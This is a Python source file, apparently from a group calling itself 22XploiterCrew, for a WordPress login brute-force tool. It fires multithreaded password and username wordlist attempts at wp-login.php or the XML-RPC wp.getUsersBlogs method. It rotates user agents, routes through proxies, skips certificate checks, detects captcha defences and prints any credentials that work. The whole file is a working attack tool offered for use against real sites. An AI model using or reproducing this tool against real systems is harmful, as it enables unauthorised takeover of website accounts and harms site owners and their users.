#!/usr/bin/env python3
"""
Author : RandsX
Team   : 22XploiterCrew
"""
import re,urllib3,requests,datetime
from time import *
from os import _exit
from random import choice
from bs4 import BeautifulSoup
from colorama import Fore as C
from argparse import ArgumentParser,SUPPRESS,FileType
from concurrent.futures import ThreadPoolExecutor,as_completed
_R='url'
_Q='html.parser'
_P='" + "'
_O='try "'
_N='please wait'
_M='\x1b[1mstarting login brute force, make sure your connection is smooth and stable\x1b[0m'
_L='res'
_K=False
_J=None
_I='"'
_H='usr'
_G='method'
_F='password'
_E='username'
_D='pwd'
_C='default'
_B='success'
_A=True
_desc='Brute Force WordPress tool with fast login features and multiple login methods.\nauthor: 22XploiterCrew\nhomepage: https://22xploitercrew.org\ngithub: https://github.com/22XploiterCrew-Team\n'
color_banner=[C.LIGHTRED_EX,C.LIGHTGREEN_EX,C.YELLOW,C.MAGENTA,C.BLUE,C.LIGHTBLUE_EX,C.CYAN]
banner="\x1b[1m _    _       _____                _                  \n| |  | |     /  __ \\              | |                 \n| |  | |_ __ | /  \\/_ __ __ _  ___| | __  _ __  _   _ \n| |/\\| | '_ \\| |   | '__/ _` |/ __| |/ / | '_ \\| | | |\n\\  /\\  / |_) {}| \\__/\\ | | (_| | (__|   < _| |_) | |_| |\n \\/  \\/| .__/ \\____/_|  \\__,_|\\___|_|\\_(_) .__/ \\{}__, |\n       | |                               | |     __/ |\n       |_|                               |_|    |___/\n{}\x1b[0m".format(choice(color_banner),C.RESET,_desc)
user_agent=['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4','Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9','Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)','Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0','Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']
times=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
data={}
proxies={}
def v_print(level,text):
	global times;times=strftime('%H:%M:%S',localtime())
	if level==0:text='[{}ERROR{}] {}'.format(C.LIGHTRED_EX,C.RESET,text)
	elif level==1:text='[{}WARNING{}] {}'.format(C.YELLOW,C.RESET,text)
	elif level==2:text='[{}INFO{}] {}'.format(C.GREEN,C.RESET,text)
	elif level==3:text='[{}\x1b[1mSUCCESS\x1b[0m{}] \x1b[1m{}\x1b[0m'.format(C.LIGHTGREEN_EX,C.RESET,text)
	elif level==4:text='[{}FAILED{}] {}'.format(C.RED,C.RESET,text)
	elif level==5:text='[{}CRITICAL{}] {}'.format(C.RED,C.RESET,text)
	timing='['+C.BLUE+times+C.RESET+']';print(timing,text)
def checkUrl(url,timeout,method):
	A='input';global times,user_agent;print('[*] Starting at',times,'\n');v_print(2,'Checking valid url');sleep(1.1)
	if re.search('(http|https)://[\\w-]+(.[\\w-]+)+\\S*',url)is _J:v_print(5,'you must enter a protocol url or the url you entered is invalid');_exit(0)
	if method==_C:v_print(1,'using a "default" method for login');url=url+'/wp-login.php'
	else:v_print(1,'using a "xmlrpc" method for login');url=url+'/xmlrpc.php'
	sleep(0.9)
	if timeout is _J:timeout=10
	v_print(2,'testing connection with timed out '+str(timeout)+' second');sleep(0.5);v_print(1,'using UserAgent "'+choice(user_agent)+'" to try first request')
	try:
		res=requests.get(url,timeout=10);v_print(2,'stable connection')
		if method==_C:
			v_print(2,'check the wordpress login form');print('this check only appears when you use the "default" method');sleep(1.1);soup=BeautifulSoup(res.content,_Q);log=soup.find(A,A,id='user_login');pwd=soup.find(A,A,id='user_pass')
			if pwd and log is not _J:v_print(2,'wordpress login form found')
	except Exception as err:v_print(5,err);_exit(0)
	return url
def formTarget(usr,pwd,method):
	if method==_C:body={'log':usr,_D:pwd}
	else:body='<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>'.format(usr,pwd)
	return body
def status(data,method):
	status={_B:_K,_E:data[_H],_F:data[_D],_G:method}
	if method==_C:
		if re.search('/wp-admin',data[_L][_R]):status={_B:_A,_E:data[_H],_F:data[_D],_G:method}
	elif'isAdmin'in str(data[_L]['_content']):status={_B:_A,_E:data[_H],_F:data[_D],_G:method}
	return status
def login(url,usr,pwd,method,timeout,proxy):
	global data,proxies,user_agent;form=formTarget(usr,pwd,method);requests.packages.urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning);opener=requests.session();header={'User-agent':choice(user_agent)}
	if proxy is not _J:proxies=proxy.split(':');proxies={proxies[0]:proxies[1]};opener.proxy=proxies
	try:
		res=opener.post(url+'/',data=form,allow_redirects=_A,timeout=timeout,verify=_K);data={_H:usr,_D:pwd,_L:vars(res)};opener.cookies.clear();soup=BeautifulSoup(res.content,_Q);title=soup.find('title').get_text()
		if re.search('Captcha|reCaptcha|captcha|recaptcha|error|Error',title):raise Exception('captcha is detected or the system is equipped with brute force protection')
		return status(data,method)
	except requests.exceptions.ReadTimeout as err:v_print(0,err);_exit(0)
	except requests.exceptions.ConnectionError as err:v_print(5,err);_exit(0)
	except urllib3.exceptions.ProxySchemeUnknown as err:v_print(5,err);_exit(0)
	except Exception as err:v_print(0,err);_exit(0)
def completed(url,data,stop):
	A='=';global start
	if data[_B]is _A:
		v_print(3,'success login on the target');print(A*(len(url)+12));print('Target:',url)
		try:print('Username:',data[_E]);print('Password:',data[_F]);print('Method:',data[_G])
		except:v_print(0,'failed to get data')
		print(A*(len(url)+12))
	else:v_print(4,'failed to login and fetch data on the target')
	if stop is _A:_exit(0)
def readList(list):
	lists=[]
	for line in list.readlines():lists.append(line.replace('\n',''))
	return lists
if __name__=='__main__':
	print(banner);parser=ArgumentParser(usage='use "python3 %(prog)s -h/--help" for more information');parser.add_argument('-V','--version',action='version',version='%(prog)s version 1.4 not stable');parser.add_argument('-s','--show',action='store_true',dest='show',help='show login process');parser.add_argument('--timeout',dest='timeout',type=int,help='set timed out request');parser.add_argument('--proxies',dest='proxy',help='use a proxies in the request');parser.add_argument('-mt',choices=[_C,'xmlrpc'],dest=_G,default=_C,help='method login (default "%(default)s")');target=parser.add_argument_group('target','if you want to use a wordlist of each of these arguments, add the letter "f" behind the argument (ex: "-pf password.txt"). NOT FOR TARGET');target.add_argument('-t','--target',metavar='',dest=_R,help='target url link (ex. https://site.com/)');target.add_argument('-u','--username',metavar='',dest=_H,help='insert a username for the target');target.add_argument('-p','--password',metavar='',dest=_D,help='insert a password for the target');wordlist=parser.add_argument_group('wordlist');wordlist.add_argument('-uf',dest='usrs',help=SUPPRESS,type=FileType('r'));wordlist.add_argument('-pf',dest='pwds',help=SUPPRESS,type=FileType('r'));args=parser.parse_args();processed=[]
	if args.url:
		url=checkUrl(args.url,args.timeout,args.method)
		if args.proxy:v_print(2,'proxy used "'+args.proxy+_I)
		if args.usr and not args.usrs:
			if args.pwd and not args.pwds:
				if args.show:v_print(2,'trying login with username "'+args.usr+'" and password "'+args.pwd+_I)
				else:v_print(2,'loading . . .')
				tes=login(url,args.usr,args.pwd,args.method,args.timeout,args.proxy);completed(url,tes,_K)
			elif args.pwds and not args.pwd:
				passwords=readList(args.pwds);v_print(2,_M)
				if not args.show:v_print(2,_N)
				with ThreadPoolExecutor()as executor:
					for pwd in passwords:processed.append(executor.submit(login,url,args.usr,pwd,args.method,args.timeout,args.proxy))
					for process in as_completed(processed):
						process=process.result()
						if args.show:v_print(2,_O+args.usr+_P+process[_F]+_I)
						if process[_B]is _A:completed(url,process,_A)
		elif args.usrs and not args.usr:
			if args.pwd and not args.pwds:
				users=readList(args.usrs);v_print(2,_M)
				if not args.show:v_print(2,_N)
				with ThreadPoolExecutor()as executor:
					for usr in users:processed.append(executor.submit(login,url,usr,args.pwd,args.method,args.timeout,args.proxy))
					for process in as_completed(processed):
						process=process.result()
						if args.show:v_print(2,_O+process[_E]+_P+args.pwd+_I)
						if process[_B]is _A:completed(url,process,_A)
			elif args.pwds and not args.pwd:
				users=readList(args.usrs);passwords=readList(args.pwds);v_print(2,_M)
				if not args.show:v_print(2,_N)
				with ThreadPoolExecutor()as executor:
					for usr in users:
						for pwd in passwords:processed.append(executor.submit(login,url,usr,pwd,args.method,args.timeout,args.proxy))
					for process in as_completed(processed):
						process=process.result()
						if args.show:v_print(2,_O+process[_E]+_P+process[_F]+_I)
						if process[_B]is _A:completed(url,process,_A)